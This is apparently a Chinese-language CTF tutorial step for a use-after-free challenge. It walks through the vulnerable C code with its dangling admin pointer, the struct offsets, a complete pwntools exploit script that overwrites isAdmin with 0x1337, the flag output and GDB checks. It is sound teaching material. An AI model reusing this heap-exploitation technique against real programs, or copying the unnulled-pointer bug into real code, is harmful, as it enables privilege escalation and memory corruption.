# Level 2: Use-After-Free - 完整解题步骤

## 目标回顾

修改已释放的 `admin` 用户，使 `admin->isAdmin = 0x1337`，从而触发胜利函数。

## 详细步骤

### 第一步：分析程序

```
$ ./l2_vuln
═════════════════════════════════════════════════════
   Level 2: Use-After-Free Challenge
═════════════════════════════════════════════════════

[+] Created admin user at 0x5555555592a0
    Username: admin
    isAdmin: 1

[+] Created user at 0x555555559310

Menu:
  1. Free admin
  2. Edit user
  3. Print admin info
  4. Exit
```

观察：
- `admin` 在 0x5555555592a0，有权限
- `user` 在 0x555555559310
- 我们可以先释放 admin，然后编辑 user

### 第二步：理解 UAF

```c
case 1:
    free(admin);
    // 注意：admin 指针仍指向 0x5555555592a0!
    printf("[*] Freeing admin...\n");
    break;
```

释放后，`admin` 指针未清空，形成 **dangling pointer**。

### 第三步：计算偏移

```c
typedef struct {
    char username[32];  // 偏移 0
    char bio[64];       // 偏移 32
    int isAdmin;        // 偏移 96
} User;
```

要覆盖 `isAdmin`，需要写入 96 字节到 bio 字段。

### 第四步：构造 Payload

```python
from pwn import *

# 构造 bio：64字节填充 + isAdmin值
bio = b"A" * 64 + p32(0x1337)
```

解释：
- `b"A" * 64`：填充 bio 的 64 字节
- `p32(0x1337)`：小端序打包 0x1337（4字节）
- 总共 68 字节

### 第五步：编写 Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

# 启动进程
p = process('./l2_vuln')

# 步骤1：释放 admin
p.sendlineafter(b'> ', b'1')
p.recvuntil(b'Admin freed')

# 步骤2：编辑 user
p.sendlineafter(b'> ', b'2')

# Username (最多31字符)
p.sendlineafter(b'username: ', b'hacker')

# Bio (64字节填充 + isAdmin = 0x1337)
bio_payload = b"A" * 64 + p32(0x1337)
p.sendlineafter(b'bio: ', bio_payload)

# 步骤3：打印 admin info (触发 UAF)
p.sendlineafter(b'> ', b'3')

# 接收输出
output = p.recvall(timeout=1).decode()
print(output)

if 'Flag:' in output:
    log.success("Pwned!")
```

### 第六步：验证利用

```
$ python3 exploit.py
...
[*] Admin info:
  Username: hacker
  Bio: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  isAdmin: 4919

╔════════════════════════════════════════╗
║     Congratulations! 🎉                ║
║     UAF Exploit Successful!            ║
╠════════════════════════════════════════╣
║  Flag: FLAG{level_02_uaf_passed}       ║
╚════════════════════════════════════════╝
```

### 第七步：使用 GDB 调试

```bash
$ gdb ./l2_vuln
(gdb) break main
(gdb) run

# 在 free(admin) 后设置断点
(gdb) break *main+XXX
(gdb) continue

# 输入 1 (free admin)

# 查看 admin 指向的内存
(gdb) x/30gx 0x5555555592a0

# 继续执行，输入 2 (edit user)
# 输入 username 和 bio

# 再次查看
(gdb) x/30gx 0x5555555592a0
```

你应该看到内存内容改变了！

## 关键要点

1. **Dangling Pointer**：`free()` 后指针未置空
2. **堆重用**：后续 `malloc()` 可能返回相同地址
3. **类型混淆**：通过 `user` 修改 `admin` 的内容
4. **权限提升**：通过 UAF 改变 `isAdmin` 值

## 常见错误

### 错误 1：偏移计算错误

```python
# ❌ 错误：只写了 32 字节
bio = b"A" * 32 + p32(0x1337)

# ✅ 正确：写 64 字节填充
bio = b"A" * 64 + p32(0x1337)
```

### 错误 2：忘记输入 username

```python
# ❌ 错误：直接输入 bio
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'bio: ', bio)  # 会卡住等待 username!

# ✅ 正确：先输入 username
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'username: ', b'hacker')
p.sendlineafter(b'bio: ', bio)
```

## 进阶挑战

完成基础挑战后，尝试：

1. **不使用 bio 字段**：能否通过 username 修改 isAdmin？
2. **多次 UAF**：free → alloc → free → alloc，观察内存变化
3. **信息泄露**：能否读取其他用户的数据？

## 下一步

恭喜完成 Level 2！继续学习 **[Level 3: Fastbin Double Free](../level03_fastbin_dup/)**

在下一关，你将学习：
- Fastbin 的内部机制
- Double Free 漏洞
- 如何操纵 malloc 的返回地址
